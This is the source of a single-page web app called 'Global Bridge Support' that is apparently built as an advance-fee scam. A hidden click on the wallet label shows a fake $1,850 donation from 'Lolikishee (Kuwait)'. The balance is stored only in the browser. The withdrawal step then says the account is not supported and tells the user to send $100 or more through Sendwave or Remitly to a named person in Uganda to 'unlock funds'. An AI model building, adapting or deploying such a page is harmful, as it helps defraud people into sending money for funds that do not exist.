<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Bridge Support</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/lucide-react@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@700;900&display=swap');
        body { font-family: 'Inter', sans-serif; }
        .font-outfit { font-family: 'Outfit', sans-serif; }
        @keyframes loading { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        .animate-loading { animation: loading 2s linear infinite; }
    </style>
</head>
<body class="bg-slate-50 antialiased text-slate-900">
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;
        
        // Correctly access Lucide Icons from the window object
        const Icons = window.LucideReact;

        function App() {
            const [appState, setAppState] = useState(() => localStorage.getItem('gbs_app_state') || 'hero');
            const [user, setUser] = useState(() => JSON.parse(localStorage.getItem('gbs_user') || 'null'));
            const [walletBalance, setWalletBalance] = useState(() => parseFloat(localStorage.getItem('gbs_wallet_balance') || '0'));
            const [hasReceivedDonation, setHasReceivedDonation] = useState(() => localStorage.getItem('gbs_received_donation') === 'true');
            const [showLoading, setShowLoading] = useState(false);
            const [loadingMessage, setLoadingMessage] = useState('');
            const [notification, setNotification] = useState(null);

            useEffect(() => { localStorage.setItem('gbs_app_state', appState); }, [appState]);
            useEffect(() => { localStorage.setItem('gbs_wallet_balance', walletBalance); }, [walletBalance]);
            useEffect(() => { localStorage.setItem('gbs_received_donation', hasReceivedDonation); }, [hasReceivedDonation]);

            const handleRegister = (e) => {
                e.preventDefault();
                const fd = new FormData(e.target);
                const data = Object.fromEntries(fd);
                setUser(data);
                setLoadingMessage('submit your story for public support globally');
                setShowLoading(true);
                setTimeout(() => { setShowLoading(false); setAppState('dashboard'); }, 7000);
            };

            const triggerEpay = () => {
                setLoadingMessage('Initiating 1850$ on your Global Bridge wallet as donation from lolikishee Kuwait');
                setShowLoading(true);
                setTimeout(() => {
                    setShowLoading(false);
                    setNotification({
                        title: 'Deposit detected 1850$',
                        content: (
                            <div className="space-y-4 text-sm">
                                <p><strong>Sender:</strong> Lolikishee (Kuwait)</p>
                                <p><strong>Receiver:</strong> {user?.accountName || 'Verified Member'}</p>
                                <button onClick={() => { setWalletBalance(1850); setHasReceivedDonation(true); setNotification(null); }} className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">Okay i have understood</button>
                            </div>
                        )
                    });
                }, 8000);
            };

            const handleWithdrawal = () => {
                setLoadingMessage(`configuring deposit of 1850$ to ${user?.accountName}`);
                setShowLoading(true);
                setTimeout(() => {
                    setShowLoading(false);
                    setNotification({
                        title: `ACCOUNT NOT SUPPORTED`,
                        content: (
                            <div className="space-y-4 text-sm">
                                <div className="bg-red-50 p-4 rounded-xl text-red-800"><strong>Step 1:</strong> Download Sendwave or Remitly.</div>
                                <div className="bg-blue-50 p-4 rounded-xl text-blue-800"><strong>Step 2:</strong> Support Brenda Ajaimbo (Uganda) with $100+ to unlock funds.</div>
                                <button onClick={() => setNotification(null)} className="w-full bg-slate-900 text-white py-4 rounded-xl font-bold">Okay</button>
                            </div>
                        )
                    });
                }, 7000);
            };

            return (
                <div className="min-h-screen">
                    {appState === 'hero' && (
                        <div className="h-screen relative flex flex-col items-center justify-center text-center p-6">
                            <img src="https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?q=80&w=2070" className="absolute inset-0 w-full h-full object-cover z-0" />
                            <div className="absolute inset-0 bg-black/50 backdrop-blur-[2px] z-10"></div>
                            <div className="relative z-20 text-white space-y-6">
                                <h1 className="text-5xl font-black font-outfit">Global Bridge Support</h1>
                                <button onClick={() => setAppState('register')} className="bg-blue-600 px-8 py-4 rounded-xl font-bold">Get Started</button>
                            </div>
                        </div>
                    )}

                    {appState === 'register' && (
                        <div className="min-h-screen flex items-center justify-center bg-slate-100 p-4">
                            <form onSubmit={handleRegister} className="bg-white p-8 rounded-[2rem] shadow-xl w-full max-w-lg space-y-4">
                                <h2 className="text-2xl font-black text-blue-600 uppercase text-center">Registration</h2>
                                <input required name="fullName" placeholder="Full Name" className="w-full p-3 border rounded-xl" />
                                <input required name="accountName" placeholder="Account Name" className="w-full p-3 border rounded-xl" />
                                <button type="submit" className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold">Submit</button>
                            </form>
                        </div>
                    )}

                    {appState === 'dashboard' && (
                        <div className="p-6 max-w-4xl mx-auto space-y-6">
                            <div className="bg-blue-600 p-8 rounded-[2rem] text-white flex justify-between items-center">
                                <div>
                                    <h2 className="text-3xl font-black">{user?.fullName}</h2>
                                    <p className="opacity-80">Raised: ${hasReceivedDonation ? '1,850' : '0'}</p>
                                </div>
                                <button onClick={() => setAppState('wallet')} className="bg-white text-blue-600 px-6 py-3 rounded-xl font-bold flex items-center gap-2">
                                    <Icons.Wallet size={20} /> My Wallet
                                </button>
                            </div>
                        </div>
                    )}

                    {appState === 'wallet' && (
                        <div className="min-h-screen bg-slate-900 text-white p-6">
                            <div className="max-w-md mx-auto space-y-8">
                                <div className="text-center">
                                    <p onClick={triggerEpay} className="text-[10px] text-blue-400 font-black tracking-[0.4em] cursor-pointer uppercase">Global Bridge Epay</p>
                                    <h1 className="text-2xl font-black italic">WALLET</h1>
                                </div>
                                <div className="bg-blue-600 p-8 rounded-[2rem]">
                                    <p className="text-xs uppercase opacity-70">Balance</p>
                                    <h2 className="text-5xl font-black">${walletBalance.toLocaleString()}</h2>
                                </div>
                                <button onClick={handleWithdrawal} disabled={!hasReceivedDonation} className={`w-full p-6 rounded-2xl border flex items-center justify-center gap-4 ${hasReceivedDonation ? 'bg-white text-black' : 'opacity-20'}`}>
                                    <Icons.ArrowUpRight /> Withdrawal
                                </button>
                                <button onClick={() => setAppState('dashboard')} className="w-full py-4 border rounded-xl">Back</button>
                            </div>
                        </div>
                    )}

                    {showLoading && (
                        <div className="fixed inset-0 bg-slate-900/95 z-[100] flex flex-col items-center justify-center p-10 text-center text-white">
                            <Icons.Loader2 className="w-16 h-16 animate-spin text-blue-500 mb-4" />
                            <h2 className="text-2xl font-black uppercase">{loadingMessage}</h2>
                        </div>
                    )}

                    {notification && (
                        <div className="fixed inset-0 bg-black/80 z-[110] flex items-center justify-center p-4">
                            <div className="bg-white text-slate-900 p-8 rounded-[2rem] w-full max-w-md">
                                <h3 className="text-xl font-black uppercase mb-4">{notification.title}</h3>
                                {notification.content}
                            </div>
                        </div>
                    )}
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
